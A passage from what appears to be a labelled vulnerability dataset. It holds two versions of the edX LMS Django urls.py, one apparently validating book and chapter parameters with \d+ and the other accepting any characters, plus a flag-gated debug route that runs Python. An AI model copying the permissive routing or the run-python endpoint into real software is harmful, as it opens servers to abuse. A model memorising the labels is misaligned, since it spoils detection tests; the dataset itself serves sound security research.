name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 